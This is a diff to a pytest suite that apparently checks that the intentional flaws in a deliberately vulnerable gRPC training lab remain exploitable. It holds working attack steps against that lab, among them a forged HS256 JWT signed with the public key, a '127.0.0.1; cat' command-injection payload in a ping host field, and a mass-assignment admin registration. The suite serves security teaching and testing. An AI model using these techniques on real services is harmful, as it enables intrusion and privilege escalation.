@@ -5,6 +5,7 @@ Each test proves the intentional vulnerability is still exploitable — if a
 future refactor accidentally fixes one of these, CI fails, and someone has to
 decide whether to update the challenge docs or restore the vuln.
 """
+
 from __future__ import annotations
 
 import pytest
@@ -48,6 +49,7 @@ def test_admin_system_info_leaks_jwt_secret(channel):
     resp = stub.GetSystemInfo(admin_pb2.GetSystemInfoRequest())
     assert resp.jwt_secret  # non-empty means leak regression
 
+
 # ----- Challenge 03 — SQL injection ----------------------------------
 def test_product_search_sql_injection(channel):
     from generated import product_pb2, product_pb2_grpc
@@ -63,6 +65,7 @@ def test_product_search_sql_injection(channel):
 # ----- Challenge 04 — JWT algorithm confusion ------------------------
 def test_jwt_algorithm_confusion(channel):
     import jwt as pyjwt
+
     from generated import auth_pb2, auth_pb2_grpc, user_pb2, user_pb2_grpc
 
     # 1. Fetch the public key
@@ -73,7 +76,8 @@ def test_jwt_algorithm_confusion(channel):
     # 2. Forge an HS256 token using the public key as the HMAC secret
     forged = pyjwt.encode(
         {"user_id": 1, "username": "admin", "role": "admin"},
-        pub, algorithm="HS256",
+        pub,
+        algorithm="HS256",
     )
 
     # 3. Use it against an authenticated endpoint
@@ -117,16 +121,19 @@ def test_path_traversal_reads_secret_flag(channel):
 
 
 # ----- Challenge 07 — Command injection ------------------------------
-def test_command_injection_via_ping(channel):
+def test_command_injection_via_ping(channel, runtime_root):
     from generated import auth_pb2, auth_pb2_grpc, command_pb2, command_pb2_grpc
 
     auth = auth_pb2_grpc.AuthServiceStub(channel)
     tok = auth.Login(auth_pb2.LoginRequest(username="alice", password="alice123")).token
 
     cmd = command_pb2_grpc.CommandServiceStub(channel)
-    # Injection via host field — `; cat ...`
+    # The `runtime_root` fixture owns where the server writes its flags,
+    # so we cat that exact file — works in Docker, local, and pytest.
+    flag_path = runtime_root / "secret" / "cmd_flag.txt"
+    payload = f"127.0.0.1; cat {flag_path}"
     resp = cmd.Ping(
-        command_pb2.PingRequest(host="127.0.0.1; cat /app/secret/cmd_flag.txt || cat ./.dvgrpc/secret/cmd_flag.txt", count=1),
+        command_pb2.PingRequest(host=payload, count=1),
         metadata=(("authorization", f"Bearer {tok}"),),
     )
     assert "FLAG{" in resp.output
@@ -134,15 +141,20 @@ def test_command_injection_via_ping(channel):
 
 # ----- Challenge 08 — Mass assignment --------------------------------
 def test_mass_assignment_role_escalation(channel):
-    from generated import auth_pb2, auth_pb2_grpc
     import uuid
+
+    from generated import auth_pb2, auth_pb2_grpc
 
     auth = auth_pb2_grpc.AuthServiceStub(channel)
     username = f"attacker_{uuid.uuid4().hex[:8]}"
-    resp = auth.Register(auth_pb2.RegisterRequest(
-        username=username, password="pw12345",
-        email="e@x.local", role="admin",
-    ))
+    resp = auth.Register(
+        auth_pb2.RegisterRequest(
+            username=username,
+            password="pw12345",
+            email="e@x.local",
+            role="admin",
+        )
+    )
     assert resp.success
     # Login and verify role
     tok = auth.Login(auth_pb2.LoginRequest(username=username, password="pw12345"))
@@ -176,10 +188,8 @@ def test_paginated_search_negative_per_page_dumps_all(channel):
     from generated import product_pb2, product_pb2_grpc
 
     stub = product_pb2_grpc.ProductServiceStub(channel)
-    normal = stub.PaginatedSearch(
-        product_pb2.PaginatedSearchRequest(query="", page=0, per_page=5))
-    all_rows = stub.PaginatedSearch(
-        product_pb2.PaginatedSearchRequest(query="", page=0, per_page=-1))
+    normal = stub.PaginatedSearch(product_pb2.PaginatedSearchRequest(query="", page=0, per_page=5))
+    all_rows = stub.PaginatedSearch(product_pb2.PaginatedSearchRequest(query="", page=0, per_page=-1))
     assert all_rows.total_returned > normal.total_returned
     joined = " ".join(p.description for p in all_rows.products)
     assert "FLAG{int3g3r_b0unds_n0t_v4l1d4t3d}" in joined
